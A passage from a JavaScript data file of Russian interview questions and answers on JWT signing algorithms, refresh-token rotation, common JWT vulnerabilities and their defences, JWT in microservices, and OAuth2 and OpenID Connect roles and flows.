Токен в памяти, не в localStorage</li><li>✅ HTTPS везде</li><li>✅ CSP для защиты от XSS</li><li>✅ Автоматический refresh</li><li>✅ Очистка токена при logout</li><li>✅ Проверка exp перед отправкой</li></ul>",
    difficulty: 'middle',
    tags: ['JWT', 'безопасность', 'защита', 'хранение', 'клиент-сервер']
  },

  {
    id: 66,
    question: "Какую роль играют алгоритмы подписи (signature algorithms) при использовании JWT?",
    answer: "<p><strong>Алгоритмы подписи</strong> — это криптографические методы, обеспечивающие целостность и подлинность JWT.</p><p><strong>Основные типы алгоритмов:</strong></p><p><strong>1. Симметричные алгоритмы (HMAC):</strong></p><p><strong>HS256 (HMAC-SHA256):</strong></p><ul><li>Один секретный ключ для подписи И проверки</li><li>Быстрый и простой</li><li>Ключ должен быть на всех серверах</li></ul><p><strong>Как работает:</strong></p><ul><li>signature = HMAC-SHA256(header + payload, secret)</li><li>Тот же секрет для создания и проверки</li></ul><p><strong>HS384, HS512:</strong></p><ul><li>Та же идея, но SHA-384 и SHA-512</li><li>Более длинный hash</li></ul><p><strong>Преимущества HMAC:</strong></p><ul><li>✅ Быстрая работа</li><li>✅ Простая реализация</li><li>✅ Меньше вычислительных ресурсов</li></ul><p><strong>Недостатки HMAC:</strong></p><ul><li>❌ Секрет должен быть везде</li><li>❌ Любой с секретом может создавать токены</li><li>❌ Сложнее для микросервисов</li><li>❌ Риск компрометации если секрет утёк</li></ul><p><strong>2. Асимметричные алгоритмы (RSA, ECDSA):</strong></p><p><strong>RS256 (RSA-SHA256):</strong></p><ul><li>Пара ключей: приватный и публичный</li><li>Приватный — для подписи (только auth сервер)</li><li>Публичный — для проверки (любой сервер)</li></ul><p><strong>Как работает:</strong></p><ul><li>Подпись: RSA-sign(hash(header + payload), privateKey)</li><li>Проверка: RSA-verify(signature, hash(header + payload), publicKey)</li></ul><p><strong>RS384, RS512:</strong></p><ul><li>RSA с SHA-384 и SHA-512</li></ul><p><strong>ES256 (ECDSA-SHA256):</strong></p><ul><li>Эллиптические кривые</li><li>Быстрее RSA при той же безопасности</li><li>Меньший размер ключей</li></ul><p><strong>ES384, ES512:</strong></p><ul><li>ECDSA с разными кривыми</li></ul><p><strong>Преимущества асимметричных:</strong></p><ul><li>✅ Публичный ключ можно раздавать всем</li><li>✅ Только auth сервер может создавать токены</li><li>✅ Идеально для микросервисов</li><li>✅ Компрометация публичного ключа не критична</li></ul><p><strong>Недостатки асимметричных:</strong></p><ul><li>❌ Медленнее симметричных</li><li>❌ Больший размер подписи</li><li>❌ Сложнее настройка</li></ul><p><strong>3. Алгоритм 'none' (без подписи):</strong></p><ul><li>❌ НЕТ подписи вообще</li><li>❌ Любой может создать токен</li><li>❌ НИКОГДА не использовать в production</li><li>❌ Существует для тестирования</li></ul><p><strong>Критическая уязвимость:</strong></p><ul><li>Атакующий меняет alg на 'none'</li><li>Удаляет подпись</li><li>Сервер принимает если не проверяет alg</li><li>✅ Защита: явно указывать algorithms: ['RS256']</li></ul><p><strong>Выбор алгоритма:</strong></p><table><tr><th>Сценарий</th><th>Рекомендация</th><th>Причина</th></tr><tr><td>Монолит</td><td>HS256</td><td>Простота, скорость</td></tr><tr><td>Микросервисы</td><td>RS256 или ES256</td><td>Раздача публичного ключа</td></tr><tr><td>Высокая нагрузка</td><td>ES256</td><td>Быстрее RSA</td></tr><tr><td>Legacy системы</td><td>RS256</td><td>Широкая поддержка</td></tr></table><p><strong>Практические примеры:</strong></p><p><strong>HS256 использование:</strong></p><ul><li>const token = jwt.sign(payload, 'secret', { algorithm: 'HS256' });</li><li>const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256'] });</li></ul><p><strong>RS256 использование:</strong></p><ul><li>Создание: jwt.sign(payload, privateKey, { algorithm: 'RS256' });</li><li>Проверка: jwt.verify(token, publicKey, { algorithms: ['RS256'] });</li></ul><p><strong>Роль алгоритма подписи:</strong></p><p><strong>1. Обеспечение целостности:</strong></p><ul><li>Любое изменение header или payload → подпись не совпадёт</li><li>Невозможно подделать без ключа</li></ul><p><strong>2. Аутентификация источника:</strong></p><ul><li>Только тот, у кого есть ключ, создал токен</li><li>Гарантия что токен от доверенного сервера</li></ul><p><strong>3. НЕ обеспечивает конфиденциальность:</strong></p><ul><li>❌ Payload не зашифрован</li><li>✅ Любой может декодировать и прочитать</li><li>Для секретности нужен JWE (JSON Web Encryption)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Явно указывать ожидаемый алгоритм при проверке</li><li>✅ Микросервисы — асимметричные алгоритмы</li><li>✅ Монолит/простой API — HMAC</li><li>✅ Минимум SHA-256 (не SHA-1)</li><li>✅ Никогда не использовать 'none'</li><li>✅ Проверять alg перед верификацией</li></ul>",
    difficulty: 'middle',
    tags: ['JWT', 'алгоритмы подписи', 'криптография', 'HMAC', 'RSA', 'ECDSA']
  },

  {
    id: 67,
    question: "Как реализовать Refresh Token механизм для JWT и почему он важен?",
    answer: "<p><strong>Refresh Token механизм</strong> решает проблему баланса между безопасностью и удобством пользователя.</p><p><strong>Проблема без Refresh Token:</strong></p><ul><li>Короткий срок жизни access token (15 мин) → частые логины → плохой UX</li><li>Длинный срок жизни access token (30 дней) → больший риск при краже</li><li>Невозможно отозвать JWT до истечения</li></ul><p><strong>Решение — два типа токенов:</strong></p><p><strong>Access Token:</strong></p><ul><li>Короткий срок жизни (15-30 минут)</li><li>Используется для API запросов</li><li>Хранится в памяти или sessionStorage</li><li>НЕ хранится на сервере (stateless)</li></ul><p><strong>Refresh Token:</strong></p><ul><li>Длинный срок жизни (7-30 дней)</li><li>Используется ТОЛЬКО для получения нового access token</li><li>Хранится в БД на сервере (stateful)</li><li>Можно отозвать в любой момент</li></ul><p><strong>Flow работы:</strong></p><ol><li>👤 Пользователь логинится</li><li>← { accessToken (15 мин), refreshToken (7 дней) }</li><li>💾 Клиент: accessToken в памяти, refreshToken в HttpOnly cookie</li><li>🔄 API запросы с accessToken</li><li>⏰ Access token истёк → 401</li><li>🔄 POST /auth/refresh с refreshToken</li><li>✅ Сервер проверяет refresh в БД</li><li>← { accessToken (новый), refreshToken (опционально новый) }</li><li>🔁 Продолжение работы</li></ol><p><strong>Реализация на сервере:</strong></p><p><strong>При логине:</strong></p><ul><li>1. Создать access token: jwt.sign({ userId }, secret, { expiresIn: '15m' })</li><li>2. Создать refresh token: crypto.randomBytes(64).toString('hex')</li><li>3. Сохранить refresh в БД: { token, userId, expiresAt, createdAt }</li><li>4. Вернуть оба токена</li></ul><p><strong>При refresh запросе:</strong></p><ul><li>1. Получить refreshToken из запроса</li><li>2. Найти в БД: findOne({ token: refreshToken })</li><li>3. Проверки: существует? не истёк? не отозван?</li><li>4. Создать новый access token</li><li>5. (Опционально) Создать новый refresh token и удалить старый (rotation)</li><li>6. Вернуть новый access token</li></ul><p><strong>Refresh Token Rotation (повышенная безопасность):</strong></p><p><strong>Принцип:</strong></p><ul><li>При каждом использовании refresh token</li><li>Старый удаляется, создаётся новый</li><li>Один refresh token = одноразовый</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Обнаружение кражи токена</li><li>✅ Меньшее окно компрометации</li></ul><p><strong>Reuse Detection:</strong></p><ul><li>Если использован уже использованный refresh token</li><li>Это признак кражи!</li><li>→ Отозвать ВСЕ refresh tokens пользователя</li><li>→ Требовать повторный логин</li></ul><p><strong>Хранение Refresh Token на клиенте:</strong></p><p><strong>Вариант 1 — HttpOnly Cookie (рекомендуется):</strong></p><ul><li>✅ Защита от XSS</li><li>✅ Автоматическая отправка</li><li>❌ Нужна CSRF защита</li><li>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</li></ul><p><strong>Вариант 2 — localStorage (НЕ рекомендуется):</strong></p><ul><li>❌ Уязвимо к XSS</li><li>✅ Нет CSRF проблем</li><li>Только если XSS защита очень сильная</li></ul><p><strong>Отзыв Refresh Tokens:</strong></p><p><strong>При logout:</strong></p><ul><li>DELETE FROM refresh_tokens WHERE token = ?</li><li>Сразу становится невалидным</li></ul><p><strong>При смене пароля:</strong></p><ul><li>DELETE FROM refresh_tokens WHERE userId = ?</li><li>Все устройства разлогинены</li></ul><p><strong>При подозрении на взлом:</strong></p><ul><li>DELETE FROM refresh_tokens WHERE userId = ? AND deviceId != current</li><li>Удалить все кроме текущего устройства</li></ul><p><strong>Структура БД для refresh tokens:</strong></p><ul><li>Table: refresh_tokens</li><li>- id</li><li>- token (уникальный, индексированный)</li><li>- userId</li><li>- expiresAt</li><li>- createdAt</li><li>- deviceInfo (User-Agent, IP)</li><li>- isRevoked (для soft delete)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Access token — короткий (15-30 мин)</li><li>✅ Refresh token — средний (7-30 дней)</li><li>✅ Rotation при каждом использовании</li><li>✅ Reuse detection и отзыв при атаке</li><li>✅ Хранение refresh в HttpOnly cookie</li><li>✅ Логирование всех refresh операций</li><li>✅ Rate limiting на /refresh endpoint</li><li>✅ Отзыв при logout и смене пароля</li></ul><p><strong>Почему это важно:</strong></p><ul><li>✅ Баланс безопасности и UX</li><li>✅ Возможность отзыва доступа</li><li>✅ Обнаружение компрометации</li><li>✅ Контроль активных сессий</li><li>✅ Защита от длительной эксплуатации украденного токена</li></ul>",
    difficulty: 'senior',
    tags: ['JWT', 'Refresh Token', 'безопасность', 'аутентификация', 'rotation']
  },

  {
    id: 68,
    question: "Какие уязвимости существуют при работе с JWT и как их предотвратить?",
    answer: "<p><strong>JWT имеет специфичные уязвимости</strong>, которые нужно знать и предотвращать.</p><p><strong>1. Algorithm Confusion Attack (подмена алгоритма):</strong></p><p><strong>Суть атаки:</strong></p><ul><li>JWT подписан RS256 (асимметричный)</li><li>Атакующий меняет alg на HS256 (симметричный)</li><li>Использует публичный ключ как секрет для HMAC</li><li>Публичный ключ известен всем!</li><li>Создаёт валидную подпись если сервер не проверяет alg</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Явно указывать ожидаемый алгоритм</li><li>✅ jwt.verify(token, key, { algorithms: ['RS256'] })</li><li>❌ НЕ доверять alg из header безусловно</li></ul><p><strong>2. 'None' Algorithm Attack:</strong></p><p><strong>Суть атаки:</strong></p><ul><li>Изменить alg на 'none'</li><li>Удалить подпись</li><li>Токен без проверки целостности</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Запретить 'none' в production</li><li>✅ algorithms: ['HS256', 'RS256'] — whitelist без 'none'</li></ul><p><strong>3. Слабый секретный ключ (для HMAC):</strong></p><p><strong>Проблема:</strong></p><ul><li>Простые секреты типа 'secret', '12345'</li><li>Brute force атака на подпись</li><li>Перебор популярных секретов</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Минимум 256 бит случайности</li><li>✅ crypto.randomBytes(32).toString('hex')</li><li>✅ Хранить в secrets manager</li><li>✅ Регулярная ротация</li></ul><p><strong>4. Отсутствие проверки exp (expiration):</strong></p><p><strong>Проблема:</strong></p><ul><li>Истёкший токен всё ещё принимается</li><li>Украденный токен работает вечно</li></ul><p><strong>Защита:</strong></p><ul><li>✅ ВСЕГДА проверять exp</li><li>✅ Библиотеки делают это по умолчанию</li><li>✅ НЕ отключать проверку</li></ul><p><strong>5. Чувствительные данные в Payload:</strong></p><p><strong>Проблема:</strong></p><ul><li>Payload не зашифрован, только закодирован</li><li>Любой может декодировать Base64</li><li>Пароли, номера карт, секреты видны всем</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Хранить только неконфиденциальные данные</li><li>✅ userId, role, email — OK</li><li>❌ password, creditCard, SSN — НЕТ</li><li>Или использовать JWE для шифрования</li></ul><p><strong>6. XSS атака при хранении в localStorage:</strong></p><p><strong>Проблема:</strong></p><ul><li>JWT в localStorage доступен JavaScript</li><li>XSS может украсть токен</li><li>localStorage.getItem('token')</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Хранить в памяти (переменная)</li><li>✅ Или HttpOnly cookie</li><li>✅ CSP для предотвращения XSS</li><li>✅ Санитизация user input</li></ul><p><strong>7. CSRF при хранении в cookie:</strong></p><p><strong>Проблема:</strong></p><ul><li>Cookie автоматически отправляется</li><li>Cross-site запрос включает токен</li></ul><p><strong>Защита:</strong></p><ul><li>✅ SameSite=Strict для cookie</li><li>✅ CSRF токены</li><li>✅ Проверка Origin заголовка</li></ul><p><strong>8. Невозможность отзыва (по умолчанию):</strong></p><p><strong>Проблема:</strong></p><ul><li>JWT stateless</li><li>Нельзя отозвать до истечения exp</li><li>Украденный токен валиден до exp</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Короткий exp для access token</li><li>✅ Refresh token с хранением в БД</li><li>✅ Blacklist для отозванных (jti в Redis)</li></ul><p><strong>9. JWT в URL параметрах:</strong></p><p><strong>Проблема:</strong></p><ul><li>URL логируются сервером, прокси, браузером</li><li>История браузера содержит токен</li><li>Referer header может утечь токен</li></ul><p><strong>Защита:</strong></p><ul><li>❌ НИКОГДА не передавать в URL</li><li>✅ Только в Authorization заголовке</li><li>✅ Или в HttpOnly cookie</li></ul><p><strong>10. Replay Attack:</strong></p><p><strong>Проблема:</strong></p><ul><li>Перехваченный токен переиспользуется</li><li>До истечения exp токен валиден</li></ul><p><strong>Защита:</strong></p><ul><li>✅ HTTPS (защита от перехвата)</li><li>✅ Короткий exp</li><li>✅ Одноразовые токены для критичных операций</li><li>✅ Device fingerprinting</li></ul><p><strong>11. Массовое присвоение (Mass Assignment):</strong></p><p><strong>Проблема:</strong></p><ul><li>Злонамеренный пользователь добавляет claims</li><li>{ userId: 1, role: 'user' } → { userId: 1, role: 'admin' }</li><li>Сервер доверяет всем claims</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Проверять критичные claims на сервере</li><li>✅ Не доверять role из токена безусловно</li><li>✅ Сверять с БД для важных операций</li></ul><p><strong>Комплексная защита:</strong></p><ul><li>✅ Правильная конфигурация алгоритма</li><li>✅ Сильный секретный ключ</li><li>✅ Короткий exp + refresh механизм</li><li>✅ Безопасное хранение на клиенте</li><li>✅ HTTPS везде</li><li>✅ CSP против XSS</li><li>✅ SameSite против CSRF</li><li>✅ Логирование и мониторинг</li><li>✅ Rate limiting</li><li>✅ Регулярные security аудиты</li></ul>",
    difficulty: 'senior',
    tags: ['JWT', 'уязвимости', 'безопасность', 'атаки', 'защита']
  },

  {
    id: 69,
    question: "Как работает JWT в микросервисной архитектуре и какие паттерны применяются?",
    answer: "<p><strong>JWT идеально подходит для микросервисов</strong> благодаря stateless природе и возможности независимой верификации.</p><p><strong>Базовая схема в микросервисах:</strong></p><ol><li>🔐 <strong>Authentication Service</strong> — выдаёт JWT</li><li>🌐 <strong>API Gateway</strong> — первичная верификация</li><li>⚙️ <strong>Микросервисы</strong> — вторичная верификация (опционально)</li></ol><p><strong>Паттерн 1 — Централизованная аутентификация:</strong></p><p><strong>Архитектура:</strong></p><ul><li>Один Auth Service для всех сервисов</li><li>Асимметричная криптография (RS256/ES256)</li><li>Auth Service имеет приватный ключ</li><li>Все сервисы имеют публичный ключ</li></ul><p><strong>Flow:</strong></p><ol><li>👤 Client → Auth Service: login</li><li>← JWT (подписан приватным ключом)</li><li>🔄 Client → API Gateway: request + JWT</li><li>✅ Gateway проверяет JWT (публичный ключ)</li><li>→ Микросервис: request + JWT (или только данные из JWT)</li><li>Микросервис обрабатывает запрос</li></ol><p><strong>Преимущества:</strong></p><ul><li>✅ Каждый сервис может валидировать независимо</li><li>✅ Нет единой точки отказа при проверке</li><li>✅ Масштабируемость</li></ul><p><strong>Паттерн 2 — JWT с claims для авторизации:</strong></p><p><strong>Структура токена:</strong></p><ul><li>{ userId: 123, role: 'admin', permissions: ['read:users', 'write:orders'], tenantId: 'company-a' }</li></ul><p><strong>Использование:</strong></p><ul><li>Каждый микросервис проверяет необходимые claims</li><li>Order Service: проверяет permissions.includes('write:orders')</li><li>User Service: проверяет permissions.includes('read:users')</li><li>Multi-tenancy: проверяет tenantId</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Нет запросов к Auth Service для проверки прав</li><li>✅ Decentralized авторизация</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Права в токене могут устареть</li><li>❌ Нужно ждать exp для обновления прав</li></ul><p><strong>Паттерн 3 — Gateway-level проверка:</strong></p><p><strong>Архитектура:</strong></p><ul><li>API Gateway проверяет JWT</li><li>Извлекает данные пользователя</li><li>Передаёт в микросервисы через внутренние headers</li></ul><p><strong>Flow:</strong></p><ol><li>Client → Gateway: JWT</li><li>Gateway проверяет, декодирует</li><li>Gateway → Service: X-User-Id: 123, X-User-Role: admin</li><li>Микросервис доверяет headers от Gateway</li></ol><p><strong>Преимущества:</strong></p><ul><li>✅ Микросервисы не думают о JWT</li><li>✅ Централизованная логика проверки</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Gateway — критичный компонент</li><li>❌ Нужна защита внутренних headers</li></ul><p><strong>Паттерн 4 — Token Exchange (OAuth2 Token Exchange):</strong></p><p><strong>Сценарий:</strong></p><ul><li>Service A нужно вызвать Service B от имени пользователя</li></ul><p><strong>Flow:</strong></p><ol><li>Service A имеет user JWT</li><li>Service A → Auth Service: обмен токена</li><li>← JWT для Service B (специфичный scope)</li><li>Service A → Service B: новый JWT</li></ol><p><strong>Преимущества:</strong></p><ul><li>✅ Principle of least privilege</li><li>✅ Service B получает минимальные права</li></ul><p><strong>Паттерн 5 — Service-to-Service JWT:</strong></p><p><strong>Проблема:</strong></p><ul><li>Сервисы общаются между собой</li><li>Нужна аутентификация сервиса, не пользователя</li></ul><p><strong>Решение:</strong></p><ul><li>Отдельные JWT для межсервисного общения</li><li>{ serviceId: 'order-service', scope: 'read:inventory' }</li><li>Выдаются при старте сервиса или по запросу</li></ul><p><strong>Управление публичными ключами:</strong></p><p><strong>JWKS (JSON Web Key Set) endpoint:</strong></p><ul><li>Auth Service публикует публичные ключи</li><li>GET /auth/.well-known/jwks.json</li><li>Микросервисы загружают при старте или кэшируют</li></ul><p><strong>Ротация ключей:</strong></p><ul><li>Периодическая смена ключей для безопасности</li><li>Старые ключи в JWKS для переходного периода</li><li>kid (key ID) в JWT header для выбора ключа</li></ul><p><strong>Best Practices для микросервисов:</strong></p><ul><li>✅ Асимметричная криптография (RS256/ES256)</li><li>✅ JWKS endpoint для раздачи публичных ключей</li><li>✅ Короткий exp для access token (5-15 мин)</li><li>✅ Gateway проверяет + сервисы могут перепроверить</li><li>✅ Claims для авторизации в токене</li><li>✅ Service mesh для внутреннего общения (mTLS)</li><li>✅ Логирование всех верификаций</li><li>✅ Correlation ID для трейсинга</li></ul><p><strong>Проблемы и решения:</strong></p><p><strong>Устаревшие данные в токене:</strong></p><ul><li>Проблема: права изменились, но токен старый</li><li>Решение: короткий exp или проверка критичных прав в БД</li></ul><p><strong>Отзыв токенов:</strong></p><ul><li>Проблема: stateless = нельзя отозвать</li><li>Решение: короткий exp + refresh mechanism + blacklist в Redis</li></ul><p><strong>Network latency:</strong></p><ul><li>Проблема: каждый сервис проверяет сам</li><li>Решение: Gateway проверяет, сервисы доверяют или кэшируют результат</li></ul>",
    difficulty: 'senior',
    tags: ['JWT', 'микросервисы', 'архитектура', 'паттерны', 'distributed systems']
  },

  {
    id: 70,
    question: "В чём разница между JWT, OAuth2 и OpenID Connect?",
    answer: "<p><strong>JWT, OAuth2 и OpenID Connect</strong> — это разные вещи, которые часто используются вместе, но решают разные задачи.</p><p><strong>JWT (JSON Web Token):</strong></p><p><strong>Что это:</strong></p><ul><li>Формат для передачи информации</li><li>Технология кодирования и подписи</li><li>НЕ протокол аутентификации/авторизации</li></ul><p><strong>Назначение:</strong></p><ul><li>Компактный способ передать claims</li><li>Self-contained — всё внутри токена</li><li>Может использоваться где угодно</li></ul><p><strong>Аналогия:</strong></p><ul><li>JWT — это конверт с информацией</li><li>Может содержать любые данные</li><li>Подпись гарантирует подлинность</li></ul><p><strong>OAuth2:</strong></p><p><strong>Что это:</strong></p><ul><li>Протокол авторизации (НЕ аутентификации!)</li><li>Делегирование доступа третьим приложениям</li><li>Framework, описывающий flows</li></ul><p><strong>Назначение:</strong></p><ul><li>Получить ограниченный доступ без пароля</li><li>\"Приложение X хочет читать ваши email\"</li><li>Выдача access tokens третьим приложениям</li></ul><p><strong>Основные роли:</strong></p><ul><li>Resource Owner — пользователь (владелец данных)</li><li>Client — приложение (запрашивает доступ)</li><li>Authorization Server — выдаёт токены</li><li>Resource Server — API с защищёнными ресурсами</li></ul><p><strong>OAuth2 flows:</strong></p><ul><li>Authorization Code — для веб/мобильных приложений</li><li>Implicit — устаревший, для SPA</li><li>Client Credentials — для сервис-к-сервису</li><li>Resource Owner Password — для доверенных приложений</li></ul><p><strong>Важно:</strong></p><ul><li>OAuth2 НЕ говорит формат токена</li><li>Может быть JWT, может быть opaque token</li><li>OAuth2 — про авторизацию, НЕ про \"кто ты\"</li></ul><p><strong>OpenID Connect (OIDC):</strong></p><p><strong>Что это:</strong></p><ul><li>Надстройка над OAuth2</li><li>Добавляет аутентификацию к авторизации</li><li>Протокол для \"единого входа\" (SSO)</li></ul><p><strong>Назначение:</strong></p><ul><li>Узнать \"кто пользователь\"</li><li>Получить профиль пользователя</li><li>Single Sign-On между приложениями</li></ul><p><strong>Что добавляет к OAuth2:</strong></p><ul><li><strong>ID Token</strong> — JWT с информацией о пользователе</li><li><strong>UserInfo endpoint</strong> — получить полный профиль</li><li><strong>Стандартные claims</strong> — sub, name, email, picture</li><li><strong>Authentication flows</strong> — поверх OAuth2</li></ul><p><strong>ID Token структура:</strong></p><ul><li>{ sub: 'user-id', name: 'John Doe', email: 'john@example.com', iss: 'https://auth.example.com', aud: 'client-id', exp: 1234567890 }</li></ul><p><strong>Разница между Access Token и ID Token:</strong></p><table><tr><th>Аспект</th><th>Access Token</th><th>ID Token</th></tr><tr><td>Протокол</td><td>OAuth2</td><td>OIDC</td></tr><tr><td>Назначение</td><td>Доступ к API</td><td>Информация о пользователе</td></tr><tr><td>Для кого</td><td>Resource Server</td><td>Client приложение</td></tr><tr><td>Формат</td><td>Любой (часто JWT)</td><td>Всегда JWT</td></tr><tr><td>Содержимое</td><td>Scopes, permissions</td><td>User identity claims</td></tr></table><p><strong>Сравнение всех трёх:</strong></p><table><tr><th>Вопрос</th><th>JWT</th><th>OAuth2</th><th>OIDC</th></tr><tr><td>Что это?</td><td>Формат токена</td><td>Протокол авторизации</td><td>Протокол аутентификации</td></tr><tr><td>Решает</td><td>Как передать данные</td><td>Как дать доступ</td><td>Кто пользователь</td></tr><tr><td>Уровень</td><td>Технология</td><td>Framework</td><td>Надстройка над OAuth2</td></tr></table><p><strong>Как они работают вместе:</strong></p><p><strong>Типичный сценарий (OIDC + JWT):</strong></p><ol><li>👤 Пользователь логинится через OIDC provider</li><li>← ID Token (JWT) — кто пользователь</li><li>← Access Token (JWT) — для API доступа</li><li>← Refresh Token — для обновления</li><li>Client сохраняет ID Token для профиля</li><li>Client использует Access Token для API</li></ol><p><strong>Практические примеры:</strong></p><p><strong>\"Войти через Google\":</strong></p><ul><li>Это OIDC (аутентификация)</li><li>Использует OAuth2 flows</li><li>Возвращает ID Token (JWT формат)</li></ul><p><strong>\"Дать доступ к Google Drive\":</strong></p><ul><li>Это OAuth2 (авторизация)</li><li>НЕ OIDC (не про \"кто ты\")</li><li>Access Token (может быть JWT)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Используйте OIDC для аутентификации пользователей</li><li>✅ OAuth2 для делегирования доступа к API</li><li>✅ JWT как формат для токенов</li><li>✅ ID Token — только для клиента, не для API</li><li>✅ Access Token — для доступа к защищённым ресурсам</li></ul>",
    difficulty: 'senior',
    tags: ['JWT', 'OAuth2', 'OpenID Connect', 'аутентификация', 'авторизация', 'протоколы']
  },
  {
    id: 71,
    question: "Что такое OAuth и для каких целей он используется в веб-приложениях?",
    answer: "<p><strong>OAuth (Open Authorization)</strong> — это открытый протокол авторизации, позволяющий предоставлять третьим приложениям ограниченный доступ к ресурсам пользователя без передачи пароля.</p><p><strong>Основная задача OAuth:</strong></p><ul><li>Делегирование доступа — \"разреши приложению X читать мои данные\"</li><li>Без передачи credentials третьей стороне</li><li>Ограниченный и контролируемый доступ</li><li>Возможность отозвать доступ в любой момент</li></ul><p><strong>Зачем нужен OAuth:</strong></p><p><strong>Проблема без OAuth:</strong></p><ul><li>Приложение просит ваш пароль от Google/Facebook</li><li>Получает полный доступ ко всему аккаунту</li><li>Невозможно ограничить права</li><li>Нельзя отозвать доступ без смены пароля</li><li>Риск утечки credentials</li></ul><p><strong>С OAuth:</strong></p><ul><li>✅ Приложение не знает ваш пароль</li><li>✅ Доступ только к запрошенным данным (scopes)</li><li>✅ Можно отозвать в любой момент</li><li>✅ Временный доступ через токены</li></ul><p><strong>Основные сценарии использования:</strong></p><p><strong>1. Social Login («Войти через...»):</strong></p><ul><li>\"Войти через Google/Facebook/GitHub\"</li><li>Не нужно создавать новый аккаунт</li><li>Приложение получает базовую информацию</li></ul><p><strong>2. Доступ к API третьих сервисов:</strong></p><ul><li>\"Приложение хочет читать ваш Google Calendar\"</li><li>\"Разрешить доступ к контактам\"</li><li>Ограниченный доступ к конкретным данным</li></ul><p><strong>3. Интеграции между сервисами:</strong></p><ul><li>Zapier подключается к десяткам сервисов</li><li>Notion синхронизируется с Google Drive</li><li>Автоматизация через безопасный доступ</li></ul><p><strong>Ключевые преимущества:</strong></p><ul><li>✅ Безопасность — нет передачи паролей</li><li>✅ Контроль — пользователь выбирает что разрешить</li><li>✅ Удобство — не нужно создавать новые аккаунты</li><li>✅ Отзыв — можно забрать права в любой момент</li><li>✅ Временность — токены истекают</li></ul><p><strong>Версии OAuth:</strong></p><ul><li>OAuth 1.0 — устарел, сложный</li><li>OAuth 2.0 — текущий стандарт, проще</li><li>OAuth 2.1 — в разработке, упрощения и улучшения</li></ul>",
    difficulty: 'junior',
    tags: ['OAuth', 'авторизация', 'безопасность', 'протоколы']
  },

  {
    id: 72,
    question: "Какие компоненты входят в архитектуру OAuth и как они взаимодействуют?",
    answer: "<p><strong>OAuth 2.0 архитектура</strong> состоит из четырёх основных ролей, каждая со своей задачей.</p><p><strong>1. Resource Owner (Владелец ресурса):</strong></p><p><strong>Кто это:</strong></p><ul><li>Конечный пользователь</li><li>Владелец данных/ресурсов</li><li>Тот, кто даёт разрешение</li></ul><p><strong>Задача:</strong></p><ul><li>Принимает решение о предоставлении доступа</li><li>Аутентифицируется на Authorization Server</li><li>Выбирает какие права (scopes) дать</li></ul><p><strong>Пример:</strong></p><ul><li>Вы — владелец своего Google аккаунта</li><li>Решаете дать приложению доступ к календарю</li></ul><p><strong>2. Client (Клиентское приложение):</strong></p><p><strong>Кто это:</strong></p><ul><li>Приложение запрашивающее доступ</li><li>Может быть веб, мобильное, десктопное</li><li>Third-party приложение или собственное</li></ul><p><strong>Задача:</strong></p><ul><li>Инициирует OAuth flow</li><li>Получает access token</li><li>Использует токен для доступа к API</li></ul><p><strong>Типы клиентов:</strong></p><ul><li><strong>Confidential</strong> — может хранить секреты (серверные приложения)</li><li><strong>Public</strong> — не может хранить секреты (SPA, мобильные)</li></ul><p><strong>Пример:</strong></p><ul><li>Приложение Notion</li><li>Мобильное приложение Instagram</li><li>Ваше веб-приложение</li></ul><p><strong>3. Authorization Server (Сервер авторизации):</strong></p><p><strong>Кто это:</strong></p><ul><li>Выдаёт токены доступа</li><li>Аутентифицирует пользователя</li><li>Управляет consent screen (экраном согласия)</li></ul><p><strong>Задачи:</strong></p><ul><li>Проверить identity пользователя</li><li>Показать что приложение запрашивает</li><li>Получить согласие пользователя</li><li>Выдать authorization code или токены</li></ul><p><strong>Endpoints:</strong></p><ul><li>/authorize — начало OAuth flow</li><li>/token — обмен code на токены</li><li>/revoke — отзыв токенов</li></ul><p><strong>Пример:</strong></p><ul><li>accounts.google.com</li><li>github.com/login/oauth</li><li>api.twitter.com/oauth2</li></ul><p><strong>4. Resource Server (Сервер ресурсов):</strong></p><p><strong>Кто это:</strong></p><ul><li>API с защищёнными данными</li><li>Хранит ресурсы пользователя</li><li>Проверяет access tokens</li></ul><p><strong>Задачи:</strong></p><ul><li>Валидировать access token</li><li>Проверить scopes (достаточно ли прав)</li><li>Вернуть запрошенные данные</li></ul><p><strong>Пример:</strong></p><ul><li>Gmail API</li><li>GitHub API</li><li>Facebook Graph API</li></ul><p><strong>Взаимодействие компонентов:</strong></p><p><strong>Базовый flow (Authorization Code):</strong></p><ol><li>📱 <strong>Client</strong> → <strong>Resource Owner</strong>: \"Нужен доступ к данным\"</li><li>👤 <strong>Resource Owner</strong> → <strong>Authorization Server</strong>: переход на страницу авторизации</li><li>🔐 <strong>Authorization Server</strong>: аутентифицирует пользователя</li><li>✅ <strong>Authorization Server</strong> → <strong>Resource Owner</strong>: \"Разрешить доступ?\"</li><li>👍 <strong>Resource Owner</strong>: даёт согласие</li><li>🎫 <strong>Authorization Server</strong> → <strong>Client</strong>: authorization code</li><li>🔄 <strong>Client</strong> → <strong>Authorization Server</strong>: обмен code на access token</li><li>🔑 <strong>Authorization Server</strong> → <strong>Client</strong>: access token + refresh token</li><li>📡 <strong>Client</strong> → <strong>Resource Server</strong>: запрос + access token</li><li>✅ <strong>Resource Server</strong>: проверяет токен</li><li>📦 <strong>Resource Server</strong> → <strong>Client</strong>: защищённые данные</li></ol><p><strong>Дополнительные компоненты:</strong></p><p><strong>Scopes (области доступа):</strong></p><ul><li>Определяют что именно разрешено</li><li>Примеры: 'read:email', 'write:calendar', 'user:profile'</li><li>Пользователь видит на consent screen</li></ul><p><strong>Tokens (токены):</strong></p><ul><li><strong>Authorization Code</strong> — временный код для обмена</li><li><strong>Access Token</strong> — для доступа к API</li><li><strong>Refresh Token</strong> — для обновления access token</li><li><strong>ID Token</strong> — информация о пользователе (OpenID 